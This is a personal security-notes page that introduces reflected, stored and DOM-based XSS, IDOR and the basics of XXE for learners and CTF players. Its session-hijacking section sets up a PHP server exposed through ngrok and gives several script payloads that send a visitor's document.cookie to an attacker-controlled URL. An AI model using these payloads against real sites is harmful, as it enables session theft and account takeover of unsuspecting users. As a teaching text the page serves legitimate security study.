---
title: Notes | Common Web Attacks
author: BatBato
date: 2022-09-11
categories: [Notes, Common Web Attacks]
tags: [Web, Common Web Attacks, XSS, XXE, IDOR, SQLi]
permalink: /Notes/Web/Common_Web_Attacks
---

# Common Web Attacks

The World Wide Web allows us to access a lot of information over the internet, whether it is a movie, your family pictures or your mail. This is also a very big battlefield between every kind of hackers. Here, we are going to talk about common web vulnerabilities such as Cross Site Scripting (```XSS```), XML External Entity (```XXE```), Insecure Direct Object Reference (```IDOR```) and SQL Injection (```SQLi```).

## XSS

XSS vulnerability result in the possibility for a user to execute Java Script code in the web page. This can change the content of the page or steal connection cookies, for example. You can find a basic exmplanation of XSS on [this video](https://www.youtube.com/watch?v=L5l9lSnNMxg). There are three different type of XSS :

- [Reflected XSS](/Notes/Web/Common_Web_Attacks#reflected-xss), where the malicious script comes from the current HTTP request.
- [Stored XSS](/Notes/Web/Common_Web_Attacks#stored-xss), where the malicious script comes from the website's database.
- [DOM-based XSS](/Notes/Web/Common_Web_Attacks#dom-based-xss), where the vulnerability exists in client-side code rather than server-side code.


### Reflected XSS

The most basic type of cross-site scripting is ```Reflected XSS```. It occurs when an application receives data from an HTTP request and unsafely incorporates that data into the immediate response.

A very simple example will be the following. Imagine a webpage that ask for the user name and execute the following ```GET``` request :
```console
https://insecure-website.com/search?name=bob
```

This request will then print ```Your name is : NAME``` where ```NAME``` will be replaced by the name given. If the website is vulnerable to ```Reflected XSS```, we could put a script as a name like :
```console
https://insecure-website.com/search?name=<script>JS_CODE</script>
```
You can replace ```JS_CODE``` by anything you want. A basic test could be :
```js
<script>alert(1)</script>
```

The ```alert``` JS function will create a pop-up that will display the text between the brackets. But as stated in [this video](https://www.youtube.com/watch?v=KHwVjzWei1c) of [LiveOverflow](https://www.youtube.com/c/LiveOverflow), the ```alert(1)``` isn't a good practice and can lead to false positive. A better way to test XSS could be the use of ```alert(document.domain)``` or ```alert(windows.origin)``` you could even use the ```console.log``` JS function.


### Stored XSS

```Second-order``` or ```persistent XSS```, often known as ```Stored XSS```, occurs when an application obtains data from an unreliable source and includes that data inadvertently in subsequent HTTP responses.

As its name suggest, the ```Stored XSS``` is ```Stored``` in the server. It often appears when someone leaves a comment and that other people can read it. The attack is basically the same for every type of XSS so you can use the previous techniques to check if the website is vulnerable. 

### DOM-based XSS

When client-side JavaScript in an application handles data from an untrusted source in an unsafe manner, typically by publishing the data back to the DOM, this is referred to as ```DOM-based XSS```, also known as ```DOM XSS```.

```DOM-based XSS``` are a bit harder to find. First we want to check for JS code in the page that we can interact with, like a ```document.write``` that write our input, for example. ```DOM.innerHTML``` and ```DOM.outerHTML``` are other JS function that write DOM objects (```add()```, ```after()```, ```append()``` are some JQuery functions that write DOM objects). Once we understand how the script work we may want to close some HTML tags so that we can input our JS malicious code. This is an example that show how to close a simple HTML tag that includes our input in its field (like an image for example) :

```console
https://insecure-website.com/search?name="><script>JS_CODE</script>
```

> You can find more detailed information about XSS on the [PortSwigger website](https://portswigger.net/web-security/cross-site-scripting).
{: .prompt-info }

> You can use the ```document.cookie``` JS function to retrieve the cookie of a user.
{: .prompt-tip }

### Session Hijaking

XSS can be used to recover sensitive information like connection cookies. We need to setup our environment so that the payload can send us back the information. First, we will start a ```php server``` on our machine and then use ```ngrok``` so that our web server is available anywhere online.

```sh
php -S localhost:1234
```

and

```sh
ngrok http 1234
```

> In real case scenario or in realistic CTF you may want to use a more standard port like ```443``` which is the port for ```HTTPS```
{: .prompt-tip }

> You may need to create a Ngrok account for this to work. Visit the created page and it should ask you to create an account.
{: .prompt-danger }

Now that our environment is ready we can send our payload like :

```sh
<script>window.open("[URL]?"+document.cookie)</script>
``` 

or

```sh
<script>document.location="[URL]?"+document.cookie;</script>
``` 

or

```sh
<script>document.write('<img src="[URL]?'+document.cookie+'"/>');</script>
``` 

Don't forget to replace ```[URL]``` by the url ngrok gives you. This will send the cookie of the person that visit the page where our payload is executed.
You can find many other payload on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).

### Automation

There are many tools out here that can help you detect XSS vulnerabilities like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), [ZAP](https://owasp.org/www-project-zap/). There are also some opensource tools that you can find on github like [XSStrike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) or [XSSer](https://github.com/epsylon/xsser).
Here is a list of different payload you may want to try when looking for XSS vulnerabilities [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md).

## IDOR

```Insecure direct object references``` (IDOR) are a type of [access control](https://portswigger.net/web-security/access-control) vulnerability that arises when an application uses user-supplied input to access objects directly.

A typical example would be a get parametter that isn't sanitized :

```console
http://insecure_website/index.php?user_id=43
```

If we are the user with the ```ID 43``` what could possibly happen if we change this value to ```0``` or ```1``` ? Generally the first user is the admin.
Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. For example, if the ID we specify is for the number of a page. It's all about weak access control system. 

> You can read more about access control [here](https://portswigger.net/web-security/access-control)
{: .prompt-info}

When looking, like here, for ```ID```, ```name``` or any other type of ```token``` we may want to automate the process so we don't do all the research by hand. We can use tools such as the ```Burp Intruder```, the ```ZAP fuzzer``` or even tools such as ```ffuf```. 

### XXE

```XML eXternal Entity``` injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. This allows an attackers to interact with any back-end or external systems that the program itself can access as well as examine files on the application server disk.

By using the XXE vulnerability to launch ```Server-Side Request Forgery``` (SSRF) attacks, an attacker may be able to escalate a XXE assault to compromise the underlying server or other back-end infrastructure in some circumstances.

```Extensible Markup Language``` (XML) is a markup language and file format for ```storing```, ```transmitting```, and ```reconstructing arbitrary data```. It defines a set of rules for encoding documents in a format that is both ```human-readable``` and ```machine-readable```.

Here is a list of some of the key elements of an XML document :

| Key | Definition | Example |
| --- | ---------- | ------- |
| Tag | The keys of an XML document, usually wrapped with (</>) characters. | \<date\> |
| Entity | XML variables, usually wrapped with (&/;) characters. | \&lt; |
| Element | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | \<date\>01-01-2022\</date\> |
| Attribute | Optional specifications for any element that are stored in the tags, which may be used by the XML parser. | version="1.0"/encoding="UTF-8" |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it. | \<?xml version="1.0" encoding="UTF-8"?\> |
